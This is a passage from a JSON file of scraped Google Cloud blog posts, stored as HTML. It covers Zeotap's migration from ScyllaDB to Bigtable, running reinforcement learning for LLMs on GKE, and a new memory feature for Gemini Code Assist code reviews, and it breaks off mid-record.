Khapra, associate professor, IIT Madras. “Indic Arena will be that platform. We are delighted to have Google Cloud's support to provide the initial compute power to bring this independent, public-facing project to life for the entire Indian AI community.\"</span></p>\n<p><span style=\"vertical-align: baseline;\">We encourage all developers, researchers, and organizations in India to explore the </span><a href=\"https://arena.ai4bharat.org/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Indic Arena platform</span></a><span style=\"vertical-align: baseline;\"> and contribute to building a more inclusive AI future.</span></p>\n<p><span style=\"vertical-align: baseline;\">We invite the entire Indian ecosystem, from startups and universities to government bodies and enterprises, to take advantage of this new, dedicated capacity for Gemini in </span><a href=\"https://cloud.google.com/vertex-ai?e=48754805\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Vertex AI</span></a><span style=\"vertical-align: baseline;\"> and our sovereign-ready infrastructure to build the next generation of AI that is built by Indians, for Indians.</span></p></div>",
        "published_date": "2025-11-11 03:30:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/products/databases/zeotap-migrates-from-scylladb-to-bigtable/",
        "title": "Zeotap's big win: 46% TCO reduction and enhanced real-time performance with Bigtable",
        "thumbnail": null,
        "author": "Sathish KS",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">In today’s fast-paced, data-driven landscape, the ability to process, analyze, and act on vast amounts of data in real time is paramount. For businesses aiming to deliver personalized customer experiences and optimize operations, the choice of database technology is a critical decision.</span></p>\n<p><span style=\"vertical-align: baseline;\">At Zeotap — a leading Customer Data Platform (CDP) — we empower enterprises to unify their data from disparate sources to build a comprehensive, unified view of their customers. This enables businesses to activate data across various channels for marketing, customer support, and analytics. Zeotap handles more than 10 billion new data points a day from more than 500 data sources across our clients, while orchestrating through more than 2000 workflows — one-third of those in real time with milliseconds latency. To meet stringent SLAs for data freshness and end-to-end latencies, performance is crucial.</span></p>\n<p><span style=\"vertical-align: baseline;\">However, as Zeotap grew, our ScyllaDB-based infrastructure faced scaling challenges, especially as the business needed to evolve towards real-time use cases and increasingly spiky workloads. We needed a more flexible, performant, cost-effective, and operationally efficient solution, which led us to </span><a href=\"https://cloud.google.com/bigtable\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Bigtable</span></a><span style=\"vertical-align: baseline;\">, a low-latency, NoSQL database service from Google Cloud for machine learning, operational analytics, and high-throughput applications. The migration resulted in significant benefits, including a 46% reduction in Total Cost of Ownership (TCO).</span></p>\n<h3><strong style=\"vertical-align: baseline;\">The challenge of scaling real-time analytics</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Zeotap's platform demands a database capable of handling a high write throughput of over 300,000 writes per second and nearly triple that in reads during peaks.</span></p>\n<p><span style=\"vertical-align: baseline;\">As our platform evolved, the initial architecture presented several hurdles:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Scalability limitations:</strong><span style=\"vertical-align: baseline;\"> We initially self-managed ScyllaDB, on-prem, and later on in the cloud. We use Spark and BigQuery for analytical batch processing, but managing these different tools and pipelines across our own environment and customer environments reached a peak where scaling became increasingly harder.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Operational overhead:</strong><span style=\"vertical-align: baseline;\"> Managing and scaling our previous database infrastructure required significant operational effort. We had to run scripts in the background to add nodes when resource alerts came up and had to map hardware to different kinds of workloads. </span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Deployment complexity:</strong><span style=\"vertical-align: baseline;\"> Embedding third-party technology in our stack complicated deployment. The commercial procurement process was also cumbersome.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Cost predictability:</strong><span style=\"vertical-align: baseline;\"> Ensuring predictable costs for us and our clients was a growing concern as our business grew.</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">These challenges drove us to re-evaluate our data infrastructure and seek a cloud-native solution that could meet our streaming first, “zero-touch” ops philosophy, while supporting our demanding OLAP and OLTP workloads.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Why Bigtable? Performance, scalability, and efficiency</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Zeotap's decision to migrate to Bigtable was driven by four key requirements:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Operational simplicity:</strong><span style=\"vertical-align: baseline;\"> Moving from ScyllaDB cluster to Bigtable meant eliminating a significant operational burden and achieving \"zero-touch ops\". Bigtable abstracts away hardware mapping and node management. This eliminates the need for maintenance windows and helps ensure data rebalancing.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Performance:</strong><span style=\"vertical-align: baseline;\"> Zeotap needed predictable performance, even in the face of regularly unpredictable workloads to meet our stringent SLAs. Bigtable’s ability to deliver low latencies for both reads and writes at scale was crucial — especially with spiky traffic patterns. </span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Efficient scalability:</strong><span style=\"vertical-align: baseline;\"> Managing ScyllaDB cluster scaling, rebalancing, and hotspots was operationally intensive. Zeotap handles very spiky and bursty workloads at times exceeding 300,000 writes per second. Bigtable disaggregates compute and storage, allowing for rapid scaling (further enhanced by </span><a href=\"https://cloud.google.com/bigtable/docs/autoscaling\"><span style=\"text-decoration: underline; vertical-align: baseline;\">autoscaling</span></a><span style=\"vertical-align: baseline;\">), which automatically adjusts cluster size in response to demand. This lead to more cost efficiency and helped eliminate idle resources.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Total cost of ownership (TCO):</strong><span style=\"vertical-align: baseline;\"> A significant driver of this migration was the need for cost efficiency and predictability. By moving from ScyllaDB to Bigtable, we achieved a significant 46% reduction in our TCO. This stems from Bigtable's efficient storage and the ability to combine use cases, such as using Bigtable as a hot store and BigQuery as a warm store.</span></p>\n</li>\n<li><strong style=\"vertical-align: baseline;\">Tight integration:</strong><span style=\"vertical-align: baseline;\"> Bigtable’s integration with other Google Cloud services, particularly BigQuery, was a major advantage in reducing operational overhead. Features like </span><a href=\"https://cloud.google.com/bigquery/docs/export-to-bigtable\"><span style=\"text-decoration: underline; vertical-align: baseline;\">reverse ETL</span></a><span style=\"vertical-align: baseline;\"> directly into Bigtable greatly simplifies data pipelines and reduces Zeotap’s operational footprint by 20%.</span></li>\n</ul></div>\n<div class=\"block-aside\"><dl>\n    <dt>aside_block</dt>\n    <dd>&lt;ListValue: [StructValue([(&#x27;title&#x27;, &#x27;Build smarter with Google Cloud databases!&#x27;), (&#x27;body&#x27;, &lt;wagtail.rich_text.RichText object at 0x7f93ac305ee0&gt;), (&#x27;btn_text&#x27;, &#x27;&#x27;), (&#x27;href&#x27;, &#x27;&#x27;), (&#x27;image&#x27;, None)])]&gt;</dd>\n</dl></div>\n<div class=\"block-paragraph_advanced\"><h3><strong style=\"vertical-align: baseline;\">Zeotap’s architectural evolution to cloud-native </strong></h3>\n<p><span style=\"vertical-align: baseline;\">Zeotap’s transition to Bigtable wasn’t an overnight lift-and-shift, but part of a strategic plan to build a streaming real-time analytics platform that could meet the needs of an evermore demanding customer landscape:</span></p>\n<ul>\n<li><strong style=\"vertical-align: baseline;\">2020</strong><span style=\"vertical-align: baseline;\">: After running one of the largest graphs with JanusGraph-on-ScyllaDB and a heavy processing operation with Spark on AWS, we made the strategic move to migrate to Google Cloud.</span></li>\n<li><strong style=\"vertical-align: baseline;\">2022</strong><span style=\"vertical-align: baseline;\">: Adopted a Lambda architecture, heavily pivoting into BigQuery, and moving away from graph due to performance issues. ScyllaDB was acting now as a pure key-value store.</span></li>\n<li><strong style=\"vertical-align: baseline;\">2023</strong><span style=\"vertical-align: baseline;\">: Shifted to a Kappa architecture, prioritizing real-time ingestion and streaming. This was a major network redesign to meet the needs of clients for real-time use cases.</span></li>\n<li><strong style=\"vertical-align: baseline;\">2024: </strong><span style=\"vertical-align: baseline;\">Fully committed to a cloud-native model with Bigtable and BigQuery as its core, while eliminating Spark from our stack.</span></li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">In our current architecture, Zeotap's ingestion layer runs via Dataflow and a home-grown streaming engine with a combination of Memorystore and Bigtable powering inline enrichment, transformation, and ingestion. We used Memorystore as a lightning-fast cache layer to speed up read-heavy workloads, while helping to reduce strain on Bigtable. Bigtable serves as the hot store for real-time ingestion and data API for low-latency point lookups, while BigQuery acts as the warm and cold store for analytics, inferencing, and batch processing.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"image1\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/image1_7bv2n8R.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Fig. 1 - Zeotap’s architecture diagram</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">This architectural transformation, with Bigtable at its heart, enables us to:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Consolidate fragmented data:</strong><span style=\"vertical-align: baseline;\"> Bigtable handles the complex multi-read/write operations required to build single customer views. The data derives from hundreds of different channels, ERP, CRM, web apps, and data warehouses. The data have different types of ID that need to get stitched together as they get consolidated into Bigtable.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Deliver real-time customer 360:</strong><span style=\"vertical-align: baseline;\"> Serves comprehensive customer profiles, including identities, attributes, streaming events, calculated attributes, and consent data — all through our Bigtable-backed data API. This enables the same unified assets available across the entire customer lifecycle — empowering customer support, marketers, and data analysts alike.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Optimize AI pipelines:</strong><span style=\"vertical-align: baseline;\"> The synergy between Bigtable as a feature store, and BigQuery as our inferencing platform by leveraging BQML, has dramatically shrunk our time to market for AI model deployment for clients — down from multiple weeks to less than a week.</span></p>\n</li>\n</ul>\n<h3><strong style=\"vertical-align: baseline;\">Results and looking forward</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Migrating to Bigtable has delivered substantial, quantifiable benefits for Zeotap. Most notably, we achieved a </span><strong style=\"vertical-align: baseline;\">46% decrease in Total Cost of Ownership (TCO)</strong><span style=\"vertical-align: baseline;\"> compared to our previous infrastructure. This cost efficiency was paired with a </span><strong style=\"vertical-align: baseline;\">20% reduction in overall operational tasks and overhead </strong><span style=\"vertical-align: baseline;\">— a direct result of the tight integration between Bigtable and BigQuery. Beyond resource savings, the platform now offers </span><strong style=\"vertical-align: baseline;\">enhanced performance and reliability </strong><span style=\"vertical-align: baseline;\">— with lower latencies — enabling us to confidently meet our stringent Service Level Agreement (SLA) commitments. Furthermore, Bigtable has improved our agility, allowing for faster deployment of AI/ML models across various environments with </span><strong style=\"vertical-align: baseline;\">efficient resource utilization</strong><span style=\"vertical-align: baseline;\">, such as reading batch workloads off our Disaster Recovery (DR) cluster.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Transform your data infrastructure with Bigtable</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Zeotap's migration is a compelling example of how choosing the right database can address the challenges of scale, performance, and operational complexity in the era of real-time data and AI. By leveraging Bigtable's capabilities for high throughput, low-latency reads, and efficient handling of demanding workloads, coupled with its seamless integration with BigQuery, Zeotap built a more flexible, efficient, and cost-effective platform that empowers customers' real-time data initiatives.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Learn more</strong></h3>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Check out the power of </span><a href=\"https://cloud.google.com/bigtable\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Bigtable</span></a><span style=\"vertical-align: baseline;\"> and begin planning your </span><a href=\"https://cloud.google.com/bigtable/docs/cloud-bigtable-for-cassandra-users\"><span style=\"text-decoration: underline; vertical-align: baseline;\">migration</span></a><span style=\"vertical-align: baseline;\"> today.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Discover </span><a href=\"https://cloud.google.com/bigtable/docs/migrate-from-cassandra\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Bigtable’s Cassandra API</span></a><span style=\"vertical-align: baseline;\"> and tools for no-downtime, no code-change migrations from ScyllaDB and Cassandra</span></p>\n</li>\n<li><span style=\"vertical-align: baseline;\">Read more about new Bigtable features like </span><a href=\"https://cloud.google.com/bigtable/docs/introduction-sql#:~:text=GoogleSQL%20for%20Bigtable,-GoogleSQL%20is%20a&amp;text=You%20can%20create%20and%20run,with%20a%20Bigtable%20client%20library.\"><span style=\"text-decoration: underline; vertical-align: baseline;\">SQL support</span></a><span style=\"vertical-align: baseline;\">, </span><a href=\"https://cloud.google.com/blog/products/databases/distributed-counting-with-bigtable\"><span style=\"text-decoration: underline; vertical-align: baseline;\">distributed counters</span></a><span style=\"vertical-align: baseline;\">, </span><a href=\"https://cloud.google.com/bigtable/docs/continuous-materialized-views\"><span style=\"text-decoration: underline; vertical-align: baseline;\">continuous materialized views</span></a><span style=\"vertical-align: baseline;\">, </span><a href=\"https://cloud.google.com/bigtable/docs/tiered-storage\"><span style=\"text-decoration: underline; vertical-align: baseline;\">tiered storage</span></a><span style=\"vertical-align: baseline;\"> and </span><a href=\"https://cloud.google.com/bigtable/docs/data-boost-overview\"><span style=\"text-decoration: underline; vertical-align: baseline;\">data boost</span></a><span style=\"vertical-align: baseline;\">.</span></li>\n</ul></div>",
        "published_date": "2025-11-10 17:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/products/compute/run-high-scale-rl-for-llms-on-gke/",
        "title": "Running high-scale reinforcement learning (RL) for LLMs on GKE",
        "thumbnail": null,
        "author": "Bogdan Berce",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">As Large Language Models (LLMs) evolve, Reinforcement Learning (RL) is becoming the crucial technique for aligning powerful models with human preferences and complex task objectives.</span></p>\n<p><span style=\"vertical-align: baseline;\">However, enterprises that need to implement and scale RL for LLMs are facing infrastructure challenges. The primary hurdles include the memory contention from concurrently hosting multiple large models (such as the actor, critic, reward, and reference models), iterative switching between high latency inference generation, and high throughput training phases.</span></p>\n<p><span style=\"vertical-align: baseline;\">This blog details Google Cloud's full-stack, integrated approach, from custom TPU hardware to the GKE orchestration layer — and shares how you can solve the hybrid, high-stakes demands of RL at scale.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">A quick primer: Reinforcement Learning (RL) for LLMs</strong></h3>\n<p><span style=\"vertical-align: baseline;\">RL is a continuous feedback loop that combines elements of both training and inference. At a high level, the RL loop for LLMs functions as follows:</span></p>\n<ol>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">The LLM generates a response to a given prompt.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">A \"reward model\" (often trained on human preferences) assigns a quantitative score, or reward, to the output.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">An RL algorithm (e.g., DPO, GRPO) uses this reward signal to update the LLM's parameters, adjusting its policy to generate higher-rewarding outputs in subsequent interactions.</span></p>\n</li>\n</ol>\n<p><span style=\"vertical-align: baseline;\">This generation, evaluation, and optimization continually improves the LLM's performance based on predefined objectives.</span></p>\n<p><span style=\"vertical-align: baseline;\">RL workloads are hybrid and cyclical. The main goal of RL is not to minimize error (training) or fast prediction (inference), but to maximize reward through iterative interaction. The primary constraint for the RL workload is not just the computational power, but also system-wide efficiency, specifically minimizing aggregate sampler latency and maximizing the speed of weight copying for efficient end-to-end step time.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Google Cloud's full-stack approach to RL</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Solving these system-wide challenges requires an integrated approach. You can't just have fast hardware or a good orchestrator; you need every layer of the stack to work together. Here is how our full-stack approach is built to solve the specific demands of RL:</span></p>\n<p><strong style=\"vertical-align: baseline;\">1. Flexible, high-performance compute (TPUs and GPUs):</strong><span style=\"vertical-align: baseline;\"> Instead of locking customers into one path, we provide two high-performance options. Our </span><strong style=\"vertical-align: baseline;\">TPU stack</strong><span style=\"vertical-align: baseline;\"> is a vertically integrated, JAX-native solution where our custom hardware (excelling at matrix operations) is co-designed with our post-training libraries (MaxText and Tunix). In parallel, we fully support the </span><strong style=\"vertical-align: baseline;\">NVIDIA GPU ecosystem</strong><span style=\"vertical-align: baseline;\">, partnering with NVIDIA on optimized NeMo RL recipes so customers can leverage their existing expertise directly on GKE.</span></p>\n<p><strong style=\"vertical-align: baseline;\">2. Holistic, full-stack optimization:</strong><span style=\"vertical-align: baseline;\"> We integrate optimization from the bare metal up. This includes our custom TPU accelerators, high-throughput storage (Managed Lustre, Google Cloud Storage), and — critically — the orchestration and scheduling that GKE provides. By optimizing the entire stack, we can attack the </span><span style=\"font-style: italic; vertical-align: baseline;\">system-wide</span><span style=\"vertical-align: baseline;\"> latencies that bottleneck hybrid RL workloads.</span></p>\n<p><strong style=\"vertical-align: baseline;\">3. Leadership in open-source:</strong><span style=\"vertical-align: baseline;\"> RL infrastructure is complex and built on a wide range of tools. Our leadership starts with open-sourcing Kubernetes and extends to active partnerships with orchestrators like Ray. We contribute to key projects like vLLM, develop open-source solutions like llm-d for cost-effective serving, and open-source our own high-performance MaxText and Tunix libraries. This helps ensure you can integrate the best tools for the job, not just the ones from a single vendor.</span></p>\n<p><strong style=\"vertical-align: baseline;\">4. Proven, mega-scale orchestration:</strong><span style=\"vertical-align: baseline;\"> Post-training RL can require compute resources that rival pre-training. This requires an orchestration layer that can manage massive, distributed jobs as a single unit. GKE AI mega-clusters support up to 65,000 nodes today, and we are heavily investing in multi-cluster solutions like MultiKueue to scale RL workloads beyond the limits of a single cluster.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Running RL workloads on GKE</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Existing GKE infrastructure is well-suited for demanding RL workloads and provides several infrastructure-level efficiencies. </span></p>\n<p><span style=\"vertical-align: baseline;\">The image below outlines the architecture and key recommendations for implementing RL at scale. </span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"image1\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/image1_HnbQkXW.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure : GKE infrastructure for running RL</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">At the base, the infrastructure layer provides the foundational hardware, including supported compute types (CPUs, GPUs, and TPUs). You can use the Run:ai model streamer to accelerate the model streaming for all three compute types. High performance storage (Managed Lustre, Cloud Storage) can be used for storage needs for RL. </span></p>\n<p><span style=\"vertical-align: baseline;\">The middle layer is the managed K8s layer powered by GKE, which handles the resource orchestration, resource obtainability using Spot or Dynamic Workload Scheduler, autoscaling, placement, job queuing and job scheduling and more at mega scale. </span></p>\n<p><span style=\"vertical-align: baseline;\">Finally, the open frameworks layer runs on top of GKE, providing the application and execution environment. This includes the managed support for open-source tools such as KubeRay, Slurm and gVisor sandbox for secure isolated task execution. </span></p>\n<h3><strong style=\"vertical-align: baseline;\">Building RL workflow</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Before creating an RL workload, you must first identify a clear use case. With that objective defined, you then architect the core components: selecting the algorithm (e.g, DPO, GRPO), the model server (like vLLM or SGLang), the target GPU/TPU hardware, and other critical configurations.</span></p>\n<p><span style=\"vertical-align: baseline;\">Next, you can provision a GKE cluster configured with Workload Identity, GCS Fuse, and DGCM metrics. For robust batch processing, install the Kueue and JobSet APIs. We recommend deploying Ray as the orchestrator on top of this GKE stack. From there, you can launch the Nemo RL container, configure it for your GRPO job, and begin monitoring its execution. For the detailed implementation steps and source code, please refer to this </span><a href=\"https://github.com/AI-Hypercomputer/gpu-recipes/tree/main/RL/a4/recipes/qwen2.5-1.5b/nemoRL\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">repository</span></a><span style=\"vertical-align: baseline;\">.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Getting started with RL</strong></h3>\n<ol>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Run RL on GPUs</strong><span style=\"vertical-align: baseline;\">: Try the RL recipe on TPUs using </span><a href=\"https://maxtext.readthedocs.io/en/latest/tutorials/grpo_with_pathways.html\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">MaxText and Pathways</span></a><span style=\"vertical-align: baseline;\"> for GRPO algorithm, or if you use GPUs, try the </span><a href=\"https://github.com/AI-Hypercomputer/gpu-recipes/tree/main/RL/a4/recipes\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">NemoRL recipes</span></a><span style=\"vertical-align: baseline;\">.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Partner with the open-source ecosystem</strong><span style=\"vertical-align: baseline;\">: Our leadership in AI is built on open standards like Kubernetes, llm-d, Ray, MaxText or Tunix. We invite you to partner with us to build the future of AI together. Come contribute to llm-d! Join the </span><a href=\"https://llm-d.ai/docs/community\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">llm-d community</span></a><span style=\"vertical-align: baseline;\">, check out the repository on GitHub, and help us define the future of open-source LLM serving.</span></p>\n</li>\n</ol></div>",
        "published_date": "2025-11-10 17:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/products/ai-machine-learning/memory-for-ai-code-reviews-using-gemini-code-assist/",
        "title": "Achieve better AI-powered code reviews using new memory capabilities on Gemini Code Assist",
        "thumbnail": null,
        "author": "Umair Idris",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">The best feedback during a code review is specific, consistent, and understands the history of a project. </span></p>\n<p><span style=\"vertical-align: baseline;\">However, AI code review agents today are often stateless; they have no memory of past interactions. This means you might find the same feedback on new pull requests that you’ve rejected before, because the agent can't learn from your team's guidance, leading to frustration and repeated work.</span></p>\n<p><span style=\"vertical-align: baseline;\">Today, we’re releasing a new memory capability for </span><a href=\"https://codeassist.google/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Gemini Code Assist</span></a><span style=\"vertical-align: baseline;\"> on GitHub for both enterprises and individual developers. Now, you can create a dynamic, evolving memory of your team's coding standards, style, and best practices, all derived from your direct interactions and feedback within pull requests. The memory is stored securely in a Google-managed project specific to your installation, isolating it from other users.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Here's how memory works</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Memory transforms the code review agent from a stateless tool into a long-term project contributor that learns and adapts to your team. </span></p>\n<p><span style=\"vertical-align: baseline;\">Automated vs. manual memory</span></p>\n<p><span style=\"vertical-align: baseline;\">Gemini Code Assist on GitHub already supports memory in the form of styleguide.md files. These rules are always added to the agent's prompt, which makes it suitable for static, universal guidelines.</span></p>\n<p><span style=\"vertical-align: baseline;\">In contrast, persistent memory introduces a more dynamic and automated approach. It automatically extracts rules from pull request interactions, requiring no manual effort. These learned rules are stored efficiently and are only retrieved and applied when they are relevant to the specific code being reviewed. This creates a smarter, more scalable memory that adapts to your team </span></p>\n<p><span style=\"vertical-align: baseline;\">The process is built on three key pillars:</span></p>\n<h4><strong style=\"vertical-align: baseline;\">1. It learns from your interactions</strong></h4>\n<p><span style=\"vertical-align: baseline;\">The process begins when you and your team do what you already do today - conducting code reviews: When a pull request is merged, Gemini Code Assist on GitHub will analyze the comment threads for feedback. For instance, if Gemini Code Assist on GitHub points out that “</span><span style=\"vertical-align: baseline;\">do not line-wrap import statements</span><span style=\"vertical-align: baseline;\">” in a .java file, and the author disagrees in their comment, the agent sees this interaction as a valuable piece of feedback and will store it. By waiting until a PR is merged, we ensure the conversation is complete and the code is a valuable source of truth.</span></p>\n<h4><strong style=\"vertical-align: baseline;\">2. It intelligently creates, updates and stores rules</strong></h4>\n<p><span style=\"vertical-align: baseline;\">From that simple interaction, persistent memory uses the powerful Gemini model to infer a generalized, reusable rule. In the example above, it would generate a natural language rule like: </span><span style=\"font-style: italic; vertical-align: baseline;\">\"In Java, </span><span style=\"font-style: italic; vertical-align: baseline;\">import statements could be </span><span style=\"font-style: italic; vertical-align: baseline;\">line-wrapped</span><span style=\"font-style: italic; vertical-align: baseline;\">”.</span></p>\n<h4><strong style=\"vertical-align: baseline;\">3. It applies rules to future reviews</strong></h4></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"image1\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/image1_ifNxRxg.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Once rules are stored in memory, the agent uses them in two critical ways:</span></p>\n<ol>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">To guide the initial review:</strong><span style=\"vertical-align: baseline;\"> Before it even begins analyzing a new pull request, the agent will query the persistent memory for a broad set of relevant rules for the repository. This helps shape its initial analysis to be more in line with your team's established patterns.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">To filter its own suggestions:</strong><span style=\"vertical-align: baseline;\"> After generating a set of draft review comments, the agent performs a second check. It retrieves highly specific rules related to its own comments and evaluates them. This acts as a filter to ensure its suggestions don't violate a previously learned best practice, allowing it to drop or modify comments before you ever see them.</span></p>\n</li>\n</ol>\n<p><span style=\"vertical-align: baseline;\">As more rules are accrued, the team's tribal knowledge is shared across the codebase through code reviews.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Getting started</strong></h3>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">New to the app?</strong><span style=\"vertical-align: baseline;\"> </span></p>\n</li>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">If you are an individual developer or OSS maintainer</span><span style=\"vertical-align: baseline;\">, install Gemini Code Assist on GitHub from the </span><a href=\"https://github.com/marketplace/gemini-code-assist\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">GitHub Marketplace.</span></a><span style=\"vertical-align: baseline;\"> </span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">If you are an enterprise customer</span><span style=\"vertical-align: baseline;\">, onboard through the </span><a href=\"https://console.cloud.google.com/gemini-code-assist/agents-tools\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Google Cloud Console.</span><span style=\"text-decoration: underline; vertical-align: baseline;\"> </span></a><span style=\"vertical-align: baseline;\">Review our documentation to learn more </span><a href=\"https://developers.google.com/gemini-code-assist/docs/set-up-code-assist-github\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">about the setup </span></a><span style=\"vertical-align: baseline;\">and using the </span><a href=\"https://developers.google.com/gemini-code-assist/docs/review-github-code\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Code Review capability</span></a><span style=\"vertical-align: baseline;\">. See </span><a href=\"https://www.youtube.com/watch?v=GILoNZWTpQ0\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">this video</span></a><span style=\"vertical-align: baseline;\"> for a walkthrough of the process.    </span></p>\n</li>\n</ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Already have the app installed?</strong><span style=\"vertical-align: baseline;\"> </span></p>\n</li>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">If you are an individual developer or OSS maintainer</span><span style=\"vertical-align: baseline;\">, enable this feature in the Gemini Code Assist on the </span><a href=\"http://codeassist.google/code-review\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Github admin panel.</span></a><span style=\"vertical-align: baseline;\"> </span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">If you are an enterprise customer</span><span style=\"vertical-align: baseline;\">, enable this feature in the </span><a href=\"https://console.cloud.google.com/gemini-code-assist/agents-tools\"><span style=\"text-decoration: 